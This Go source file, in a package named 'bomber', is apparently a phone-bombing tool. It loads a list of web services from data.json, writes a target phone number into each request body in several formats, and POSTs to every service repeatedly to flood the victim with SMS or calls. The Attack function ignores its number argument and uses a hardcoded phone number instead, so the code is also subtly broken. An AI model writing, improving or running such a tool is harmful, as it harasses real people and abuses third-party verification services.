package bomber

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

func formatnumber(format_type string, num string) string {
	switch format_type {
	// +7 (123) 456-78-90
	case "format_wide": // num[0] here is represented in bytes, so we convert it to a string :/
		return fmt.Sprintf("+%s (%s) %s-%s-%s", string(num[0]), num[1:4], num[4:7], num[7:9], num[9:11])
	// +7(123)-456-78-90
	case "format_wide1":
		return fmt.Sprintf("+%s(%s)-%s-%s-%s", string(num[0]), num[1:4], num[4:7], num[7:9], num[9:11])
	// 1234567890
	// for whatever fucking reason
	case "format_strange":
		return num[1:11]
	}

	return num
}

// i don't wanna talk about it...
func changephonenum(data interface{}, num string) {
	switch val := data.(type) {
	case map[string]interface{}:
		formattype, hasshit := val["format_type"].(string)
		if hasshit {
			num = formatnumber(formattype, num)
			delete(val, "format_type")
		}
		for i, v := range val {
			// add whatever the fuck your service wants here
			if i == "phoneNumber" || i == "phone" || i == "Number" {
				val[i] = num
			} else {
				changephonenum(v, num)
			}
		}
	case []interface{}:
		for _, v := range val {
			changephonenum(v, num)
		}
	}
}

func Attack(num string, cycles int) {
	file, err := os.ReadFile("data.json")
	if err != nil {
		log.Fatal(err)
	}

	var services map[string]interface{}

	if err := json.Unmarshal(file, &services); err != nil {
		log.Fatal(err)
	}

	for i := 0; i < cycles; i++ {
		for i, v := range services {
			changephonenum(v, "79858091820")

			reqbody, err := json.Marshal(v)
			if err != nil {
				log.Fatal(err)
			}

			resp, err := http.Post(i, "application/json", bytes.NewBuffer(reqbody))
			if err != nil {
				log.Fatal(err)
			}

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				log.Print("Error parsing the response: ", err)
			}

			log.Print("Made request to "+i+", response: ", resp.Status+" || "+string(body))

			time.Sleep(time.Second * 5)
		}
	}
}
